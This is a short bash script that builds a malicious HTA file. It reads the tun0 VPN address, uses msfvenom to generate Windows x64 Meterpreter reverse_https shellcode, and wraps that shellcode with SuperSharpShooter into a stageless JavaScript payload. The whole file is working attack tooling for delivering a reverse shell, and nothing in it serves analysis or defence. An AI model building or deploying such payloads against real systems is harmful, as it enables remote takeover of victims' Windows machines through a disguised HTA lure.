#! /bin/bash
if [ $# -eq 0 ]
then
  echo "No port specified, defaulting to port 443"
  port="443"
else
  port=$1
fi

#get ip address of tun0
ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"


msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$port -f raw -o shell.txt


python3 ./SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output payload

cat payload.head > payload.hta
cat ./output/payload.js >> payload.hta
cat payload.tail >> payload.hta

echo "Finished, payload located at payload.hta"
